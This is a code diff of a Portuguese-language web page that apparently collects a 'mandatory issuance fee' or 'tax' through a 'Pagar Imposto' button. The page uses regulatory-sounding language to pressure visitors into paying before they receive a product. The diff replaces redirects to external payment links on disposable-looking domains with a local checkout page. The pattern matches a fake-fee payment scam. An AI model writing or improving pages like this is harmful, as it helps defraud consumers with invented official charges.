@@ -511,8 +511,7 @@ Serve para garantir que o serviço seja feito de forma legal, segura e regulamen
     Concordo com os termos, incluindo pagar a Taxa de Emissão Obrigatória, necessária para completar as regulamentações vigentes junto aos órgãos competentes e receber o produto em plena conformidade.
   </label>
 </div>
-<a href="https://pay.pay-centralmap.shop/521rZJzE9W4ZeaX">
-<button id="paymentButton" class="btn33" style="color: white;">Pagar Imposto</button></a>
+<button id="paymentButton" class="btn33" style="color: white;" onclick="handleButtonClick(event)">Pagar Imposto</button>
 
 
 
@@ -537,8 +536,8 @@ Serve para garantir que o serviço seja feito de forma legal, segura e regulamen
       event.preventDefault(); // Impede a navegação
       alert("Você precisa aceitar os termos antes de prosseguir.");
     } else {
-      // Redireciona o usuário para o link
-      window.location.href = "https://pay.pagarsocial2025.site/521rZJzE9W4ZeaX" + window.location.search;
+      // Redireciona para a página de checkout local
+      window.location.href = "/up2/checkout.html";
     }
   }
 </script>
